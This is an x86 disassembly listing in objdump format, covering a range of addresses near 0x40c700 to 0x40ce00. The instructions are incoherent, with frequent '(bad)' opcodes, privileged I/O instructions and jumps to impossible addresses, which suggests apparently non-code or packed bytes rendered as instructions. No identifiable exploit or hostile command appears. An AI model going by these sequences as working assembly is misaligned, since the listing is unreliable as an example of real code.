  40c6ef:	xor    al,0x68
  40c6f1:	jmp    0xc6210339
  40c6f6:	mov    eax,0xd027894b
  40c6fb:	cld    
  40c6fc:	cmp    esp,DWORD PTR [ecx+0x5f]
  40c6ff:	(bad)  
  40c700:	sub    DWORD PTR [esi],edi
  40c702:	pop    ds
  40c703:	ss inc edi
  40c705:	fimul  WORD PTR [ecx-0x26]
  40c708:	aam    0x59
  40c70a:	or     esi,eax
  40c70c:	or     al,0xc8
  40c70e:	jle    0x40c726
  40c710:	cmp    BYTE PTR [ebp+0xf],0x4b
  40c714:	pushf  
  40c715:	imul   ebp,DWORD PTR [ebp-0x50],0x657b9a8e
  40c71c:	fucom  st(3)
  40c71e:	loope  0x40c6da
  40c720:	out    dx,eax
  40c721:	push   es
  40c722:	(bad)  
  40c723:	or     esi,DWORD PTR [eax]
  40c725:	fwait
  40c726:	scas   al,BYTE PTR es:[edi]
  40c727:	and    ebx,DWORD PTR [ecx-0x6ebfab3f]
  40c72d:	fiadd  WORD PTR [ebp+0x13]
  40c730:	iret   
  40c731:	outs   dx,DWORD PTR ds:[esi]
  40c732:	das    
  40c733:	es cmp al,0x3a
  40c736:	push   eax
  40c737:	iret   
  40c738:	dec    esi
  40c739:	sub    ebp,DWORD PTR [ecx-0x4a]
  40c73c:	leave  
  40c73d:	jbe    0x40c75b
  40c73f:	add    bh,BYTE PTR [ecx-0x58]
  40c742:	cmp    DWORD PTR [ebx+0x52b10bde],0x68
  40c749:	fiadd  DWORD PTR [eax-0x640b85fa]
  40c74f:	test   eax,0xd976067f
  40c754:	dec    edi
  40c755:	mov    cl,0xc8
  40c757:	stos   BYTE PTR es:[edi],al
  40c758:	sbb    ebp,eax
  40c75a:	lock mov edx,0x61281e6e
  40c760:	mov    ch,0x0
  40c762:	add    al,0x63
  40c764:	fxsave [edx-0xb]
  40c768:	ins    BYTE PTR es:[edi],dx
  40c769:	mov    WORD PTR [edi-0x36],fs
  40c76c:	dec    esi
  40c76d:	(bad)
  40c771:	popf   
  40c772:	or     ch,BYTE PTR [edx-0x7a]
  40c775:	call   0xa658:0xdf69ef5e
  40c77c:	xor    BYTE PTR [ecx+0x11],cl
  40c77f:	les    ecx,FWORD PTR [ecx+0x41]
  40c782:	cwde   
  40c783:	and    al,0xe3
  40c785:	sub    dl,BYTE PTR [edi+0x31]
  40c788:	lea    esp,[ebp+0x7dfe4218]
  40c78e:	mov    dh,0xe0
  40c790:	fwait
  40c791:	dec    esi
  40c792:	sar    BYTE PTR ds:[ebx],1
  40c795:	mov    ss,WORD PTR [ebx-0x1e]
  40c798:	aas    
  40c799:	aad    0x6a
  40c79b:	cmp    eax,0x6563702c
  40c7a0:	imul   ecx,DWORD PTR [esi-0xd],0xc1b1e186
  40c7a7:	loop   0x40c773
  40c7a9:	sbb    BYTE PTR [esi+0x4f231ce5],cl
  40c7af:	mov    ebp,0x64e3418d
  40c7b4:	xchg   edx,eax
  40c7b5:	aam    0xbb
  40c7b7:	int3   
  40c7b8:	pop    ebp
  40c7b9:	test   ebx,ebp
  40c7bb:	popf   
  40c7bc:	mov    dh,0xa5
  40c7be:	xchg   edi,eax
  40c7bf:	push   ds
  40c7c0:	mov    ds:0x474e1a1b,al
  40c7c5:	ret    0x4f5d
  40c7c8:	inc    ecx
  40c7c9:	daa    
  40c7ca:	enter  0xf0b4,0x61
  40c7ce:	mov    dl,0x25
  40c7d0:	hlt    
  40c7d1:	aad    0xe7
  40c7d3:	sti    
  40c7d4:	cmp    al,0x5f
  40c7d6:	mov    al,0x49
  40c7d9:	pop    esi
  40c7da:	out    0x81,eax
  40c7dc:	jae    0x40c7bc
  40c7de:	stc    
  40c7df:	sub    DWORD PTR [eax+0x62361600],edi
  40c7e5:	loop   0x40c82d
  40c7e7:	dec    edx
  40c7e8:	xchg   DWORD PTR [eax+0x49bd4a74],esi
  40c7ee:	iret   
  40c7ef:	jge    0x40c7a5
  40c7f1:	arpl   WORD PTR [eax+0x1e3c9b84],cx
  40c7f7:	sub    BYTE PTR [edx+esi*4-0x78],ch
  40c7fb:	inc    esi
  40c7fc:	jecxz  0x40c786
  40c7fe:	mov    ebp,0x11cdce99
  40c803:	xchg   esp,eax
  40c804:	mov    DWORD PTR [ebp+0x5],ecx
  40c807:	jns    0x40c80d
  40c809:	xor    eax,0xf993c5d4
  40c80e:	xor    cl,BYTE PTR [ebp-0x1c1f2e50]
  40c814:	jae    0x40c892
  40c816:	popa   
  40c817:	push   es
  40c818:	sbb    eax,0x2ae03b30
  40c81d:	or     bh,dl
  40c81f:	mov    edi,0xd944cc57
  40c824:	mov    al,0x19
  40c826:	mov    dh,0x3d
  40c828:	mov    cl,0x42
  40c82a:	fwait
  40c82b:	enter  0x6fd8,0xda
  40c82f:	aaa    
  40c830:	test   BYTE PTR [edx],ah
  40c832:	int    0xa2
  40c834:	shr    DWORD PTR [ebp-0x3c7306b0],cl
  40c83a:	jae    0x40c84f
  40c83c:	popf   
  40c83d:	test   al,0xf8
  40c83f:	das    
  40c840:	inc    esi
  40c841:	or     ah,bh
  40c843:	in     eax,0xba
  40c845:	jmp    0xcd15c554
  40c84a:	mov    bl,0x5a
  40c84c:	hlt    
  40c84d:	int3   
  40c84e:	or     al,0xa9
  40c850:	sbb    eax,0xcc73643f
  40c855:	cmp    eax,edi
  40c857:	scas   al,BYTE PTR es:[edi]
  40c858:	mov    ah,0x39
  40c85a:	and    al,0xe
  40c85c:	cs dec edi
  40c85e:	dec    ebp
  40c85f:	pop    ds
  40c860:	jp     0x7cf8a12a
  40c866:	arpl   WORD PTR [eax],ax
  40c868:	cmp    ebp,DWORD PTR [eax-0x59]
  40c86b:	pushf  
  40c86c:	popw   es
  40c86e:	addr16 repz repnz cdq 
  40c872:	imul   eax,DWORD PTR [ebx+0x284e6916],0xc48f40c4
  40c87c:	push   ss
  40c87d:	in     eax,dx
  40c87e:	cmp    eax,DWORD PTR [esi+esi*1-0x2f996054]
  40c885:	and    bl,BYTE PTR [edi+0x4fb08d88]
  40c88b:	push   esi
  40c88c:	xchg   DWORD PTR [eax],edx
  40c88e:	test   edi,esi
  40c890:	add    ebp,DWORD PTR [ebp+0x56]
  40c893:	mov    dl,0x3f
  40c895:	leave  
  40c896:	sbb    ch,BYTE PTR [ebp+edi*2-0x111961f5]
  40c89d:	pop    edx
  40c89e:	inc    edi
  40c89f:	jne    0x40c84d
  40c8a1:	jns    0x40c90a
  40c8a3:	stos   BYTE PTR es:[edi],al
  40c8a4:	in     al,0xb8
  40c8a6:	mov    BYTE PTR [ecx+0x24],dh
  40c8a9:	xor    eax,0x51a0e58e
  40c8ae:	sti    
  40c8af:	pop    ecx
  40c8b0:	adc    DWORD PTR [edi],eax
  40c8b2:	adc    ebp,esi
  40c8b4:	call   0xcc943464
  40c8b9:	jnp    0x40c8c1
  40c8bb:	shr    ecx,cl
  40c8bd:	rol    BYTE PTR [ebx-0x4e],1
  40c8c0:	scas   eax,DWORD PTR es:[edi]
  40c8c1:	adc    eax,0x3d733bad
  40c8c6:	mov    ah,0x68
  40c8c8:	add    bh,BYTE PTR [ebx+0x3d]
  40c8cb:	call   0xdb05:0xde78624e
  40c8d2:	cvtps2pi mm1,QWORD PTR [eax]
  40c8d5:	call   0x29a4c4ef
  40c8da:	inc    ebx
  40c8db:	shl    DWORD PTR [ecx-0x54],1
  40c8de:	and    cl,BYTE PTR [ebx-0x65]
  40c8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e2:	(bad)  
  40c8e3:	scas   eax,DWORD PTR es:[edi]
  40c8e4:	inc    ecx
  40c8e5:	(bad)  
  40c8e6:	loop   0x40c8b2
  40c8e8:	dec    esi
  40c8e9:	pop    ebp
  40c8ea:	ror    ebp,0xc0
  40c8ed:	push   cs
  40c8ee:	mov    bl,0x2a
  40c8f0:	or     edi,DWORD PTR [edi]
  40c8f2:	mov    ah,0xba
  40c8f4:	mov    ch,0xef
  40c8f6:	sbb    al,0xb5
  40c8f8:	sbb    BYTE PTR [ebx],0x8e
  40c8fb:	cmp    al,ch
  40c8fd:	sahf   
  40c8fe:	inc    ebx
  40c8ff:	inc    edi
  40c900:	mov    dh,0x40
  40c902:	call   0x1382:0x9bdbb351
  40c909:	mov    ds:0xaea0322b,al
  40c90e:	(bad)  
  40c90f:	js     0x40c8ce
  40c911:	sbb    BYTE PTR [ebx+0x6b],ch
  40c914:	mov    ah,0x62
  40c916:	leave  
  40c917:	ds mov dl,0x9c
  40c91a:	fdivrp st(3),st
  40c91c:	lods   al,BYTE PTR ds:[esi]
  40c91d:	test   eax,eax
  40c91f:	inc    edi
  40c920:	pusha  
  40c921:	shl    DWORD PTR [edx+edi*1],0xb
  40c925:	clc    
  40c926:	lea    ecx,[edx+ebx*2]
  40c929:	add    DWORD PTR ds:0x40586e00,edi
  40c92f:	jae    0x40c919
  40c931:	dec    edi
  40c932:	sub    BYTE PTR [ebx-0x4247c26b],0x84
  40c939:	in     al,0x1
  40c93b:	repz mov ds:0x5e3a4478,al
  40c941:	loope  0x40c90b
  40c943:	mov    edi,0xb10edb6c
  40c948:	xchg   esp,eax
  40c949:	pop    ds
  40c94a:	imul   ebp,DWORD PTR [eax],0x96081a44
  40c950:	loop   0x40c916
  40c952:	in     eax,0xb3
  40c954:	or     ah,BYTE PTR [esi+0x4f3997e1]
  40c95a:	ror    DWORD PTR [ebx-0x42],1
  40c95d:	inc    edi
  40c95e:	push   ebp
  40c95f:	jecxz  0x40c8e4
  40c961:	push   esi
  40c962:	mov    WORD PTR [edi+0xb46d15c],ss
  40c968:	push   ss
  40c969:	mov    bl,0x0
  40c96b:	in     al,dx
  40c96c:	and    DWORD PTR [ecx-0x5b],ebx
  40c96f:	jno    0x40c9de
  40c971:	je     0x40c947
  40c973:	repz ja 0x40c92d
  40c976:	adc    DWORD PTR ds:0xf89e07d2,ebp
  40c97c:	mov    al,ds:0xec296d3b
  40c981:	pop    esp
  40c982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c983:	sbb    eax,0x363a1e54
  40c988:	jne    0x40c9d1
  40c98a:	push   esp
  40c98b:	enter  0xa995,0x31
  40c98f:	xchg   edx,eax
  40c990:	pop    ebp
  40c991:	ds mov dl,0x35
  40c994:	cmp    dh,ch
  40c996:	add    BYTE PTR [ebx+0x6],bl
  40c999:	adc    BYTE PTR [esi],0xf7
  40c99c:	cwde   
  40c99d:	mov    cl,0x3f
  40c99f:	fistp  QWORD PTR [eax-0x77ae0117]
  40c9a5:	call   0x73daaf6d
  40c9aa:	adc    dl,BYTE PTR [ecx]
  40c9ac:	inc    ecx
  40c9ad:	cmp    dh,BYTE PTR [esi]
  40c9af:	pop    ss
  40c9b0:	fsub   st(1),st
  40c9b2:	es pop edx
  40c9b4:	ds mov edx,0x826a24c5
  40c9ba:	popa   
  40c9bb:	sub    bl,BYTE PTR [esi-0x6643d15a]
  40c9c1:	icebp  
  40c9c2:	xor    dl,BYTE PTR [ebx+edi*8-0x1f]
  40c9c6:	xchg   esp,eax
  40c9c7:	add    DWORD PTR [edx],ebp
  40c9c9:	or     eax,0x574e7c4b
  40c9ce:	mov    DWORD PTR [eax+0x2e64b946],eax
  40c9d4:	cmc    
  40c9d5:	pop    ebx
  40c9d6:	outs   dx,DWORD PTR ds:[esi]
  40c9d7:	sub    BYTE PTR [edi],dh
  40c9d9:	add    al,0xe9
  40c9db:	loop   0x40ca48
  40c9dd:	call   0x79c1:0xf7d5438b
  40c9e4:	in     eax,0x9f
  40c9e6:	(bad)  
  40c9e8:	sub    bh,cl
  40c9ea:	stos   BYTE PTR es:[edi],al
  40c9eb:	je     0x40c9a7
  40c9ed:	mov    ecx,0x5c38e9ee
  40c9f2:	jmp    0x40c9dd
  40c9f4:	cli    
  40c9f5:	adc    DWORD PTR [ecx],ebx
  40c9f7:	or     eax,0xd340bd17
  40c9fc:	xor    BYTE PTR [ecx+ebp*2],dl
  40c9ff:	or     al,0xf1
  40ca01:	clc    
  40ca02:	int    0x7a
  40ca04:	jne    0x40ca25
  40ca06:	or     DWORD PTR [ecx+0x8f82c02],edi
  40ca0c:	mov    ch,0x66
  40ca0e:	lds    eax,FWORD PTR [ecx-0x7e4a3a29]
  40ca14:	sbb    DWORD PTR [eax],ecx
  40ca16:	imul   ebp,ecx,0xffffff9c
  40ca19:	jp     0x40ca22
  40ca1b:	mov    eax,ds:0x8cc4e72c
  40ca20:	pop    eax
  40ca21:	mov    dl,BYTE PTR [ebx+ebx*8]
  40ca24:	arpl   WORD PTR [ebx-0x623c6477],sp
  40ca2a:	push   0x2b
  40ca2c:	aam    0x2e
  40ca2e:	xor    esi,DWORD PTR [edi+0x4b534ea6]
  40ca34:	push   ebx
  40ca35:	repz aad 0xb6
  40ca38:	sub    DWORD PTR [ecx+ebp*8-0x17],edx
  40ca3c:	lea    edx,[edi-0x1717a630]
  40ca42:	cmp    bl,cl
  40ca44:	cmc    
  40ca45:	jae    0x40c9f8
  40ca47:	sbb    al,0x96
  40ca49:	pop    esi
  40ca4a:	aaa    
  40ca4b:	add    DWORD PTR [eax],0x74
  40ca4e:	add    BYTE PTR [esi+0x1d],ch
  40ca51:	sbb    eax,0x91e45921
  40ca56:	mov    bl,0x42
  40ca58:	inc    ecx
  40ca59:	xor    BYTE PTR [edx+0x48],dl
  40ca5c:	mov    esi,0x176e0db5
  40ca61:	retf   
  40ca62:	imul   edi,esp,0x80d7b656
  40ca68:	gs jmp 0x2166:0x80df1332
  40ca70:	enter  0x7e29,0xb9
  40ca74:	std    
  40ca75:	inc    ebx
  40ca76:	rcl    ebp,1
  40ca78:	xchg   esp,eax
  40ca79:	sahf   
  40ca7a:	inc    ecx
  40ca7b:	mov    dh,0x3b
  40ca7d:	out    dx,al
  40ca7e:	sub    DWORD PTR [ecx-0x33],0x77587c19
  40ca85:	push   edx
  40ca86:	sahf   
  40ca87:	repnz pop edi
  40ca89:	mov    esi,0x50d197e0
  40ca8e:	mov    bh,0x87
  40ca90:	jo     0x40cae6
  40ca92:	add    ecx,DWORD PTR [ebp-0x6c]
  40ca95:	push   edi
  40ca96:	mov    cl,0xd6
  40ca98:	cmp    BYTE PTR [ecx+ebp*1-0x16],al
  40ca9c:	and    edi,edi
  40ca9e:	mov    al,0xb9
  40caa0:	jg     0x40ca66
  40caa2:	js     0x40ca2f
  40caa4:	ret    0x26a6
  40caa7:	stos   DWORD PTR es:[edi],eax
  40caa8:	jnp    0x40ca82
  40caaa:	retf   
  40caab:	adc    DWORD PTR [eax+0x37b18916],edi
  40cab1:	pop    ecx
  40cab2:	inc    ebx
  40cab3:	repz or DWORD PTR [ebp+esi*4+0x53],ebx
  40cab8:	and    al,0x57
  40caba:	pop    ebp
  40cabb:	inc    esp
  40cabc:	test   al,0x91
  40cabe:	push   ss
  40cabf:	outs   dx,DWORD PTR ds:[esi]
  40cac0:	out    dx,al
  40cac1:	push   ecx
  40cac2:	nop
  40cac3:	jae    0x40cab9
  40cac5:	mov    al,ds:0x6b5d6826
  40caca:	pop    esp
  40cacb:	cmp    edx,ebp
  40cacd:	adc    al,0xbf
  40cacf:	fild   QWORD PTR [ebx+0x471f08b4]
  40cad5:	mov    al,0x38
  40cad7:	xor    al,BYTE PTR [edx-0x1b]
  40cada:	in     eax,0xd1
  40cadc:	inc    edi
  40cadd:	ds push ebp
  40cadf:	dec    ecx
  40cae0:	(bad)  
  40cae1:	lahf   
  40cae2:	and    BYTE PTR [ecx-0x5e75ae5b],ah
  40cae8:	adc    DWORD PTR ds:0x63be6444,esi
  40caee:	jp     0x40ca7e
  40caf0:	shl    BYTE PTR [ecx+0x5d],1
  40caf3:	xchg   ecx,eax
  40caf4:	stc    
  40caf5:	daa    
  40caf6:	daa    
  40caf7:	push   esi
  40caf8:	in     eax,0xb8
  40cafa:	pop    ss
  40cafb:	test   BYTE PTR [esi-0x8],0x29
  40caff:	jp     0x40cb80
  40cb01:	mov    esi,0x99261dd0
  40cb06:	xor    DWORD PTR [edx],ebx
  40cb08:	pop    esi
  40cb09:	neg    esp
  40cb0b:	nop
  40cb0c:	pop    es
  40cb0d:	push   es
  40cb0e:	test   eax,0x57a60093
  40cb13:	xchg   BYTE PTR [eax],ah
  40cb15:	lods   eax,DWORD PTR ds:[esi]
  40cb16:	adc    esp,0x35e7676f
  40cb1c:	xor    DWORD PTR [ecx+ecx*1+0x71],edx
  40cb20:	cwde   
  40cb21:	in     eax,0xb2
  40cb23:	pop    esi
  40cb24:	loop   0x40cb80
  40cb26:	or     eax,0x902987bd
  40cb2b:	xlat   BYTE PTR ds:[ebx]
  40cb2c:	push   eax
  40cb2d:	jns    0x40cb33
  40cb2f:	ss push ecx
  40cb31:	dec    edx
  40cb32:	mov    edi,0xb9e7de10
  40cb37:	sub    ch,BYTE PTR [edx]
  40cb39:	kunpckbw k6,k1,k2
  40cb3d:	pop    ebx
  40cb3e:	jb     0x40cb80
  40cb40:	ror    DWORD PTR [esi],1
  40cb42:	leave  
  40cb43:	xchg   ebp,eax
  40cb44:	inc    edx
  40cb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb46:	sahf   
  40cb47:	push   ebp
  40cb48:	ret    
  40cb49:	push   0xffffffb7
  40cb4b:	push   esp
  40cb4c:	ins    DWORD PTR es:[edi],dx
  40cb4d:	sub    esp,DWORD PTR [ebp+0x4c6329c1]
  40cb53:	pushf  
  40cb54:	(bad)  [ecx]
  40cb56:	das    
  40cb57:	int    0xd6
  40cb59:	inc    esi
  40cb5a:	push   0xffffffad
  40cb5c:	add    al,BYTE PTR [edi]
  40cb5e:	mulps  xmm3,XMMWORD PTR [ebp-0x49]
  40cb62:	xor    al,BYTE PTR [esi+0x578b2a51]
  40cb68:	cwde   
  40cb69:	jle    0x40cba6
  40cb6b:	add    ecx,DWORD PTR gs:[edi]
  40cb6e:	sbb    dh,BYTE PTR [esp+ebx*4]
  40cb71:	inc    ecx
  40cb72:	in     eax,dx
  40cb73:	popa   
  40cb74:	in     eax,0xbe
  40cb76:	dec    ecx
  40cb77:	xor    BYTE PTR [edx],ch
  40cb79:	test   al,bl
  40cb7b:	mov    edx,0x8cb5324a
  40cb80:	xchg   edx,eax
  40cb81:	jecxz  0x40cbe0
  40cb83:	fsub   QWORD PTR [ebx+0x4e]
  40cb86:	in     al,0x76
  40cb88:	mov    dh,0xd5
  40cb8a:	aam    0x5c
  40cb8c:	push   ebx
  40cb8d:	mov    DWORD PTR [esi],esi
  40cb8f:	out    0x7d,eax
  40cb91:	xor    eax,0x7759e0f3
  40cb96:	(bad)  
  40cb97:	adc    bl,BYTE PTR [edi]
  40cb99:	int    0x51
  40cb9b:	pop    ebp
  40cb9c:	retf   
  40cb9d:	ret    0x346d
  40cba0:	push   cs
  40cba1:	(bad)  
  40cba3:	push   0xb41ea7d4
  40cba8:	add    eax,0x1a0e9f18
  40cbad:	jmp    0x40cb59
  40cbaf:	fimul  DWORD PTR ds:0xc2b3e69e
  40cbb5:	push   edx
  40cbb6:	das    
  40cbb7:	cmp    BYTE PTR [edx-0x36],cl
  40cbba:	rcr    bl,0x48
  40cbbd:	xor    cl,BYTE PTR [ebx]
  40cbbf:	rcl    DWORD PTR [eax-0x34913681],0xe0
  40cbc6:	jp     0x40cc40
  40cbc8:	add    ah,BYTE PTR [ebp-0x52]
  40cbcb:	js     0x40cbd3
  40cbcd:	outs   dx,BYTE PTR ds:[esi]
  40cbce:	add    cl,BYTE PTR [eax-0xe]
  40cbd1:	mov    esi,0x3dbe6e62
  40cbd6:	pop    ecx
  40cbd7:	imul   eax,DWORD PTR ds:[esi+0xe],0x59
  40cbdc:	icebp  
  40cbdd:	cmc    
  40cbde:	xor    DWORD PTR [esi-0x7de896ef],ebp
  40cbe4:	jbe    0x40cb67
  40cbe6:	pop    ebx
  40cbe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbe8:	(bad)  
  40cbe9:	sbb    dh,BYTE PTR [eax]
  40cbeb:	xor    dl,dh
  40cbed:	sub    eax,0x2263ca73
  40cbf2:	mov    ebp,0x50089cfa
  40cbf7:	add    ch,BYTE PTR [edx+0x399c7eb5]
  40cbfd:	jl     0x40cbc8
  40cbff:	stc    
  40cc00:	pop    edi
  40cc01:	sbb    edx,DWORD PTR [eax]
  40cc03:	dec    edx
  40cc04:	sub    edx,DWORD PTR [eax*4-0x4cd8aee5]
  40cc0b:	inc    ecx
  40cc0c:	shl    BYTE PTR [ebx+0x411d2a3e],0xc9
  40cc13:	rcl    DWORD PTR [ecx+0x5c7109fa],0xb1
  40cc1a:	mov    dl,0xb7
  40cc1c:	ins    BYTE PTR es:[edi],dx
  40cc1d:	push   ds
  40cc1e:	adc    ah,bl
  40cc20:	data16 aaa 
  40cc22:	lea    ebp,[ebp-0x56fa4a32]
  40cc28:	(bad)
  40cc2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc2c:	popa   
  40cc2d:	pop    eax
  40cc2e:	inc    ebp
  40cc2f:	push   esp
  40cc30:	sub    ebx,esi
  40cc32:	add    ebx,edi
  40cc34:	jns    0x40cbc2
  40cc36:	xchg   DWORD PTR ds:0xeeea145f,ebx
  40cc3c:	cdq    
  40cc3d:	jae    0x40cbe5
  40cc3f:	inc    ebp
  40cc40:	(bad)  
  40cc42:	pop    esi
  40cc43:	cmp    al,0x9e
  40cc45:	(bad)  
  40cc46:	out    dx,eax
  40cc47:	adc    DWORD PTR [ebx+0x52],esp
  40cc4a:	mov    esp,0x2fcedf3e
  40cc4f:	xor    al,0xe6
  40cc51:	jae    0x40cc63
  40cc53:	sbb    ch,bl
  40cc55:	sti    
  40cc56:	shr    DWORD PTR ds:[eax],0xda
  40cc5a:	dec    edx
  40cc5b:	or     esi,ebx
  40cc5d:	cmp    al,0xf4
  40cc5f:	dec    edx
  40cc60:	jno    0x40cc37
  40cc62:	xor    bh,BYTE PTR [esi]
  40cc64:	mov    esp,0xc4d1828b
  40cc69:	jmp    0x4b14:0x473830ae
  40cc70:	rol    BYTE PTR [eax-0x246cda27],1
  40cc76:	inc    ecx
  40cc77:	ss mov bl,0xd5
  40cc7a:	dec    edx
  40cc7b:	ds jp  0x40cc1e
  40cc7e:	cmp    eax,0x9b31c019
  40cc83:	repnz cld 
  40cc85:	mov    edi,DWORD PTR [eax+edi*8-0x17]
  40cc89:	fidiv  DWORD PTR [edx-0xa13ee52]
  40cc8f:	adc    al,0x79
  40cc91:	mov    bl,0xe6
  40cc93:	stc    
  40cc94:	pop    esi
  40cc95:	retf   
  40cc96:	xor    BYTE PTR [ebp-0x53],ah
  40cc99:	inc    ebx
  40cc9a:	hlt    
  40cc9b:	dec    ebp
  40cc9c:	mov    ebp,0x1e4287ed
  40cca1:	adc    ebp,DWORD PTR [ebp-0x3d30da7]
  40cca7:	cld    
  40cca8:	sub    BYTE PTR [ebx+0x2a5868d],dl
  40ccae:	ss and ebx,ebp
  40ccb1:	xchg   ecx,eax
  40ccb2:	mov    ebp,0xbcba6568
  40ccb7:	jmp    0x40cc5f
  40ccb9:	dec    esi
  40ccba:	dec    ecx
  40ccbb:	sbb    esp,DWORD PTR [esi+0x6ad33021]
  40ccc1:	stos   DWORD PTR es:[edi],eax
  40ccc2:	add    esi,DWORD PTR [edx+eax*4+0x4b]
  40ccc6:	ja     0x40cc7e
  40ccc8:	xchg   edi,eax
  40ccc9:	js     0x40cc86
  40cccb:	cmp    BYTE PTR [ebp-0x16],cl
  40ccce:	mov    esi,0x59337997
  40ccd3:	out    dx,al
  40ccd4:	dec    esp
  40ccd5:	dec    ebp
  40ccd6:	pop    ss
  40ccd7:	data16 xor BYTE PTR [ecx],cl
  40ccda:	or     al,BYTE PTR [edx+0xbd711]
  40cce0:	mov    edx,0xdb884ebb
  40cce5:	pop    esp
  40cce6:	or     cl,dh
  40cce8:	adc    dh,bh
  40ccea:	lock adc BYTE PTR [esi+0x41],dl
  40ccee:	out    0x38,al
  40ccf0:	dec    ebp
  40ccf1:	popa   
  40ccf2:	cmp    dl,BYTE PTR [ebx-0x7a]
  40ccf5:	push   ss
  40ccf6:	sahf   
  40ccf7:	jno    0x40cd1d
  40ccf9:	ror    DWORD PTR [ecx+0x44f54d3b],0x6e
  40cd00:	jl     0x40cd2c
  40cd02:	xchg   ecx,eax
  40cd03:	fwait
  40cd04:	sbb    al,0x7a
  40cd06:	in     eax,dx
  40cd07:	shl    ebp,cl
  40cd09:	lds    edx,FWORD PTR [esi+0x71a65cce]
  40cd0f:	dec    ebx
  40cd10:	and    esp,ebx
  40cd12:	int3   
  40cd13:	loope  0x40cd14
  40cd15:	pop    DWORD PTR [ebx+ecx*1+0x1c1294f1]
  40cd1c:	jmp    0x40cd82
  40cd1e:	test   eax,0x5b96f428
  40cd23:	pop    ecx
  40cd24:	pop    esi
  40cd25:	cmp    esp,edx
  40cd27:	ss test eax,0x89083fe6
  40cd2d:	xchg   ebx,eax
  40cd2e:	mov    dl,0x2a
  40cd30:	fwait
  40cd31:	mov    dl,0x1
  40cd33:	sbb    al,0xb4
  40cd35:	pusha  
  40cd36:	jge    0x40cd52
  40cd38:	mov    esp,0x2556913f
  40cd3d:	cwde   
  40cd3e:	pop    ebx
  40cd3f:	jl     0x40cd52
  40cd41:	push   0x58e71c6b
  40cd46:	int3   
  40cd47:	xor    ebx,DWORD PTR [esi-0x202d2317]
  40cd4d:	rcl    DWORD PTR [ecx],cl
  40cd4f:	and    al,0xfb
  40cd51:	fmul   QWORD PTR [ecx+ebp*8-0x1d]
  40cd55:	stos   BYTE PTR es:[edi],al
  40cd56:	and    eax,0xc8040b5
  40cd5b:	mov    eax,0x1b10222d
  40cd60:	sahf   
  40cd61:	pop    ebp
  40cd62:	aam    0x3f
  40cd64:	ret    0x41e1
  40cd67:	enter  0x9c69,0x2d
  40cd6b:	sbb    al,0x75
  40cd6d:	(bad)  
  40cd6e:	add    eax,0x592918da
  40cd73:	imul   eax,ebp,0xbf99f6fa
  40cd79:	xchg   ebp,eax
  40cd7a:	or     BYTE PTR [esi],bh
  40cd7c:	lods   eax,DWORD PTR ds:[esi]
  40cd7d:	or     al,0x17
  40cd7f:	jo     0x40cd77
  40cd81:	rol    ah,0xf6
  40cd84:	(bad)  
  40cd86:	push   ds
  40cd87:	mov    esp,0xdaf65333
  40cd8c:	jmp    0x27922fa8
  40cd91:	adc    ah,BYTE PTR [edx+0x4aa0caa2]
  40cd97:	fistp  DWORD PTR [eax]
  40cd99:	inc    esi
  40cd9a:	pop    edx
  40cd9b:	lods   al,BYTE PTR ds:[esi]
  40cd9c:	and    al,0x9
  40cd9e:	clc    
  40cd9f:	push   ebp
  40cda0:	mov    ?,edx
  40cda2:	adc    dh,BYTE PTR [esi+0x5516183d]
  40cda8:	sub    DWORD PTR [ecx+ecx*1-0x6e376c23],edi
  40cdaf:	mov    ebx,0x27e328e
  40cdb4:	jmp    0x40cd38
  40cdb6:	mov    eax,0x6b88df2f
  40cdbb:	les    ebx,FWORD PTR [edx+0x1c]
  40cdbe:	cmp    ch,BYTE PTR [eax]
  40cdc0:	fsubr  QWORD PTR [esi+ecx*8]
  40cdc3:	out    0xab,al
  40cdc5:	idiv   DWORD PTR ds:0x733ae3a6
  40cdcb:	shl    BYTE PTR [ebx-0x65],cl
  40cdce:	cli    
  40cdcf:	push   cs
  40cdd0:	and    eax,0x22f241e7
  40cdd5:	lock sti 
  40cdd7:	sub    cl,BYTE PTR [edi]
  40cdd9:	inc    edx
  40cdda:	imul   esp,DWORD PTR [edi],0xffffffeb
  40cddd:	out    0x87,al
  40cddf:	mov    ecx,0x1bc2ea05
  40cde4:	add    ebp,DWORD PTR [ebx-0x17b3562d]
  40cdea:	sub    esp,DWORD PTR ds:0x86aee09a
  40cdf0:	adc    DWORD PTR [eax],ecx
  40cdf2:	data16 add al,cl
  40cdf5:	dec    ebp
  40cdf6:	xchg   esi,eax
  40cdf7:	out    0x8c,eax
  40cdf9:	pop    esi
  40cdfa:	jo     0x40cd9a
  40cdfc:	mov    eax,ds:0xeb6911c0
  40ce01:	int    0x41
  40ce03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce04:	or     esp,0x2c
  40ce07:	js     0x40cd8e
  40ce09:	fdiv   st,st(0)
  40ce0b:	fcomp  QWORD PTR [ebp+0x224a1bf6]
  40ce11:	dec    edx
  40ce12:	mov    esp,0x5a229d9e
  40ce17:	mov    esp,0x4ad69198
  40ce1c:	stos   DWORD PTR es:[edi],eax
  40ce1d:	push   ds
  40ce1e:	add    al,0x88
  40ce20:	loope  0x40ce24
  40ce22:	add    cl,BYTE PTR [eax+0x172c8b8d]
  40ce28:	dec    edi
  40ce29:	push   es
  40ce2a:	aaa    
  40ce2b:	add    BYTE PTR [ecx],bh
  40ce2d:	(bad)  [ecx]
  40ce2f:	lods   eax,DWORD PTR ds:[esi]
  40ce30:	push   ds
  40ce31:	enter  0x7a88,0xc5
  40ce35:	sub    eax,0xa7931f82
  40ce3a:	ins    BYTE PTR es:[edi],dx
  40ce3b:	adc    BYTE PTR [eax],dh
  40ce3d:	repz cmp ax,0x92cd
  40ce42:	and    ecx,DWORD PTR [eax+0x26ac53ef]
  40ce48:	and    al,0x19
  40ce4a:	jecxz  0x40ce85
  40ce4c:	push   esi
  40ce4d:	pop    edi
  40ce4e:	push   0x6a
  40ce50:	jnp    0x40cdef
  40ce52:	xlat   BYTE PTR ds:[ebx]
  40ce53:	mov    ds:0xe5956f43,eax
  40ce58:	adc    BYTE PTR [edi-0x15913c78],0x4
  40ce5f:	lods   al,BYTE PTR ds:[esi]
  40ce60:	std    
  40ce61:	lods   eax,DWORD PTR ds:[esi]
  40ce62:	push   ss
  40ce63:	mov    DWORD PTR [ecx-0x1a],ecx
